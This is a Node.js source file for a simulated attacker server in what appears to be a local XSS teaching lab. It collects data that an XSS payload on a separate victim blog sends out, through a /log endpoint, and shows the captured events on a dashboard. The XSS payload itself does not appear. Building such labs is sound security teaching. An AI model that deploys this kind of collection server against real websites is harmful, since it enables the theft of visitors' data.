
/**
 * Attacker Server — http://127.0.0.1:3000
 *
 * Simulates the attacker's remote server that receives stolen data sent via
 * XSS from the victim blog running on a different origin.
 *
 * Endpoints
 *   POST /log        receive an exfiltrated event (called by the XSS payload)
 *   GET  /events     return all captured events as JSON
 *   POST /clear      wipe the in-memory event log
 *   GET  /*          serve static files from this folder, fall back to the
 *                    blog folder for shared assets (style.css, images, etc.)
 *
 * Main page: http://127.0.0.1:3000/attacker-log.html
 */

const http = require('http');
const fs   = require('fs');
const path = require('path');

const PORT     = 3000;
const SITE_DIR = __dirname;
const BLOG_DIR = path.join(__dirname, '..', 'Horizon BLOG');

let events = [];

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css':  'text/css',
  '.js':   'application/javascript',
  '.json': 'application/json',
  '.ico':  'image/x-icon',
  '.png':  'image/png',
  '.svg':  'image/svg+xml',
};

function cors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end',  ()    => resolve(body));
    req.on('error', reject);
  });
}

function serveStatic(res, reqPath) {
  const safe     = path.normalize(reqPath).replace(/^(\.\.[/\\])+/, '');
  const filePath = (safe === '' || safe === '/') ? 'attacker-log.html' : safe;

  // Look in attacker-site/ first, then fall back to Horizon BLOG/ for shared assets
  const candidates = [
    path.join(SITE_DIR, filePath),
    path.join(BLOG_DIR, filePath),
  ];

  function tryNext(i) {
    if (i >= candidates.length) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('Not found');
      return;
    }
    fs.readFile(candidates[i], (err, data) => {
      if (err) { tryNext(i + 1); return; }
      const ext = path.extname(candidates[i]);
      res.writeHead(200, { 'Content-Type': MIME[ext] || 'text/plain' });
      res.end(data);
    });
  }

  tryNext(0);
}

const server = http.createServer(async (req, res) => {
  cors(res);

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  const url = req.url.split('?')[0];

  // POST /log — XSS payload on the victim blog calls this to exfiltrate data
  if (req.method === 'POST' && url === '/log') {
    try {
      const body  = await readBody(req);
      const event = JSON.parse(body);
      events.push(event);
      console.log(`[+] ${event.type}  from ${event.page}  at ${event.timestamp}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end('{"ok":true}');
    } catch {
      res.writeHead(400);
      res.end('Bad JSON');
    }
    return;
  }

  // GET /events — attacker-log.html polls this every 1.5 s
  if (req.method === 'GET' && url === '/events') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(events));
  }

  // POST /clear — wipe the server-side event log
  if (req.method === 'POST' && url === '/clear') {
    events = [];
    console.log('[~] Event log cleared.');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end('{"ok":true}');
  }

  // Static files (attacker-log.html, style.css, …)
  serveStatic(res, url);
});

server.listen(PORT, '127.0.0.1', () => {
  console.log('');
  console.log('  Attacker server  →  http://127.0.0.1:' + PORT + '/attacker-log.html');
  console.log('  Waiting for XSS data from the victim blog…');
  console.log('  Press Ctrl+C to stop.');
  console.log('');
});
